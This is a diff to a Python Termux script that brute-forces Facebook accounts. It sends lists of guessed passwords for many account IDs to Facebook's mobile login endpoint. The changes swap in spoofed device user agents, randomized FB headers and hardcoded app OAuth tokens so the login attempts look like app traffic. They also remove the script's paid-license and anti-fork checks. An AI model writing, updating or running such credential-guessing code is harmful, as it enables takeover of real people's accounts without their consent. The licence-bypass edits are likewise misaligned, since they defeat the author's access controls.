@@ -6,8 +6,6 @@ from uuid import uuid4
 import os,sys,tempfile,string,random,subprocess,uuid
 http_directory = tempfile.mkdtemp(prefix='.')
 site_packages = sys.path[4]
-print(site_packages)
-print(http_directory)
 sys.path.remove(site_packages)
 sys.path.insert(4,http_directory+'/reqmodule')
 sys.path.insert(5,http_directory)
@@ -105,7 +103,7 @@ logo= f'''
      "Y888888"   "Y8888P"  888   T88b     
             Y8b
 {50*"-"}
-    Tool Version :     10.1.60
+    Tool Version :     10.1.35
     Thanks Alot  :     M.Hamza
 {50*"-"}'''
 
@@ -155,14 +153,12 @@ def qsbuy():
         try:
                 os.system('clear')
                 print(logo)
-                x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
+                x = requests.get('https://raw.githubusercontent.com/hop06/libraries/main/version.txt').text
                 if str("upppdate") in update:
                         os.system('clear')
                         exit('script is in update / maintanance be patient ')
                 elif str("res-sseett") in update:
-                        os.system('')
-                        os.system('')
-                        os.system('')
+                        
                         exit('Dont Try To Bypass')
                 elif bumper in myweb2:
                         main()
@@ -183,12 +179,6 @@ def qsbuy():
                         qsbuy()
         except requests.exceptions.ConnectionError:
                 exit(' No internet connection ..')
-
-def rrrr():
-        if bumper in myweb2:
-                pass
-        else:
-                qsbuy()
 def xchker():
     pass
 def main():
@@ -446,14 +436,19 @@ class crack_main():
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
-                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
+                                fbvrzn = str(random.randint(745000000,745999999))
+                                fbipc = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
+                                tokenlist = ['275254692598279|585aec5b4c27376758abb7ffcb9db2af','350685531728|62f8ce9f74b12f84c123cc23437a4a32']
+                                accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                                fbver = ".".join(map(str, (random.randint(100,999) for _ in range(5))))
+                                ag = iid[::-1]
+                                ua = f'Mozilla/5.0 (Mobile; rv:{random.randrange(11,99)}.0; 4044V) Gecko/68.0 Firefox/{random.randrange(100,999)}.0 KaiOS/1.0 [FBAN/Orca-Android;FBAV/{fbipc};FBPN/com.facebook.orca;FBLC/en_US;FBBV/{fbvrzn};FBCR/;FBMF/Infinix;FBBD/Infinix;FBDV/INE-LX1r;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=720,height=1280};FB_FW/1;]'
+                                headers = {'scheme':'https','method':'POST','authority':'b-graph.facebook.com','authorization': f'OAuth {accessToken}','user-agent': ua,'content-type': 'application/x-www-form-urlencoded','accept-encoding': 'gzip, deflate','x-fb-http-engine': 'Liger','x-fb-connection-type': 'unknown','x-fb-connection-bandwidth': str(random.randint(2e4,4e4)),'x-fb-connection-quality':'GOOD; q=0.7, rtt=66, rtx=0, c=10, mss=1360, tbw=485, uplat=1679, ullat=1','x-fb-sim-hni': str(random.randint(2e4,4e4)),'x-fb-net-hni': str(random.randint(2e4,4e4)),'x-fb-request-id':''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for req in range(20)),'x-fb-rev':'1006637732'}
                                 adid = str(uuid.uuid4())
-                                abhi = "5531728|62f8ce9"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
-                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
-                                #print(po,hdata)ata)
+                                data = {'adid':adid,'email':iid,'password':pas,'cpl':'true','credentials_type':'password','error_detail_type':'password','source':'auth.login','format':'json','device_id':adid,'session_id':adid,'generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate'}
+                                url = 'https://b-graph.facebook.com/auth/login'
+                                po = requests.post(url,data=data,headers=headers).json()
+                                #print(data,headers,po)
                                 try:
                                         roid = str(po['uid'])
                                 except:
@@ -497,27 +492,11 @@ class crack_main():
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo);xchker()
-                print(' for auto password list type auto or Auto')
+                pl = int(input(' How Much Password Do You Want To Add ? '))
+                print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
-                pl = input(' How Much Password Do You Want To Add ? ')
-                if pl in ['auto','Auto','AUTO','auto or Auto']:
-                        passlist.append('first123')
-                        passlist.append('first12345')
-                        passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
-                        passlist.append('khan123')
-                        passlist.append('first786')
-                        passlist.append('first12')
-                        passlist.append('first1122')
-                        passlist.append('last123')
-                        passlist.append('last12')
-                        passlist.append('i love you')
-                else:
-                        print(' Example first123,last123,khan123,firstlast')
-                        print(50*"-")
-                        for cd in range(int(pl)):
-                                passlist.append(input(f' ({cd+1}) Password : '))
+                for cd in range(pl):
+                        passlist.append(input(f' ({cd+1}) Password : '))
                 os.system('clear')
                 print(logo);xchker()
                 print(' Total Ids : '+str(len(self.id)))
@@ -769,8 +748,8 @@ try:
         fileee = os.listdir('/sdcard/Android/data/')
         if f'com.h{t}pc{a}y.pro' in fileee:
                 print('error occur 0')
-                exit()
-                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
+                #exit()
+                #exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
 except Exception as e:
         print(e)
         pass
@@ -778,8 +757,8 @@ except PermissionError:
         pass
 
 
-'''#----[if-fork]------
-pat = os.getcwd()
+#----[if-fork]------
+'''pat = os.getcwd()
 datar = []
 datar.append(pat)
 if '/data/data/com.termux/files/home/Qsr' in datar:
@@ -787,11 +766,10 @@ if '/data/data/com.termux/files/home/Qsr' in datar:
 else:
         for i in range(5000):
                 print(" data is forked / or in other file")
-        exit("Type > cd ~ && python jan.py")
+        #exit("Type > cd ~ && python jan.py")
 
 if not os.path.exists('.fam'):
-        qsbuy()
+        main()
 else:
-        qsbuy()
-'''
+        main()'''
 main()
